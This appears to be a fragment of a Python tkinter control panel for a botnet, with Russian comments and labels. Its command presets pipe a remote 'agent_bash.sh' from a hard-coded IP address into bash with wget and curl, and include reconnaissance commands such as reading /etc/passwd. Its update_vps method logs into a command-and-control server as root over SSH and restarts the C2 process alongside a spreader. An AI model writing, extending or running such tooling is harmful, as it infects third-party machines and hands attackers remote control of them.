import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog, filedialog
import threading, socket, json, time, subprocess, os, re, requests
from gui.widgets import RightClickMenu

COMMAND_PRESETS = {
    "wget -O- http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (wget)",
    "curl -s http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (curl)",
    "cat /etc/passwd": "Получить список пользователей",
    "whoami": "Текущий пользователь",
    "uname -a": "Информация о системе",
    "df -h": "Свободное место на дисках"
}

class BotnetTab(ttk.Frame):
    # ... (весь предыдущий код конструктора, create_widgets и всех методов остаётся без изменений)
    # Заменяем только метод update_vps

    def update_vps(self):
        if not self.vps_pass:
            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
            if not self.vps_pass:
                return
        def run():
            try:
                import paramiko
                self.spread_log.insert(tk.END, "[*] Обновление VPS через GitHub...\n")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(self.c2_host, username="root", password=self.vps_pass, timeout=10)

                # Останавливаем только C2, спредер не трогаем
                stop_cmd = "systemctl stop avz-c2; pkill -9 -f botnet/c2.py"
                client.exec_command(stop_cmd)

                update_cmd = "cd /root/c2 && git fetch origin main && git reset --hard origin/main"
                stdin, stdout, stderr = client.exec_command(update_cmd)
                out = stdout.read().decode()
                err = stderr.read().decode()
                self.spread_log.insert(tk.END, out + "\n" + err + "\n")

                # Запускаем только C2
                start_c2 = "cd /root/c2 && nohup python3 botnet/c2.py > c2.log 2>&1 &"
                client.exec_command(start_c2)

                time.sleep(3)
                check_cmd = "ss -tlnp | grep 80"
                stdin, stdout, stderr = client.exec_command(check_cmd)
                port_info = stdout.read().decode()
                self.spread_log.insert(tk.END, f"Ports:\n{port_info}")
                if "80" in port_info:
                    self.spread_log.insert(tk.END, "[+] C2 запущен успешно. Спредер запускайте кнопкой 'Запустить на VPS'.\n")
                client.close()
            except Exception as e:
                self.spread_log.insert(tk.END, f"[!] Ошибка обновления VPS: {e}\n")
        threading.Thread(target=run, daemon=True).start()
